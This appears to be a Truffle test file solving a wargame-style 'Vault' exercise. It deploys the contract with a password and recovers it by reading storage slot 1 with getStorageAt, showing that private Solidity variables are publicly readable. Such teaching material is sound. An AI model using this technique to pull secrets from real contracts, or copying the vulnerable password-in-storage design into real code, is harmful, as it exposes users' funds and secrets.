const Vault = artifacts.require("Vault");

contract("Attack", (accounts) => {
  let vaultInstance;
  const past_password =
    "0x7465737400000000000000000000000000000000000000000000000000000000";

  before(async () => {
    vaultInstance = await Vault.new(past_password);
  });

  it("should deploy the Vault contract", async () => {
    assert(vaultInstance.address !== "", "Vault contract not deployed");
  });

  it("should get the password", async () => {
    const guessed_password = await web3.eth.getStorageAt(
      vaultInstance.address,
      1
    );
    assert.equal(
      past_password,
      guessed_password,
      "You haven't guessed the password correctly"
    );
  });
});
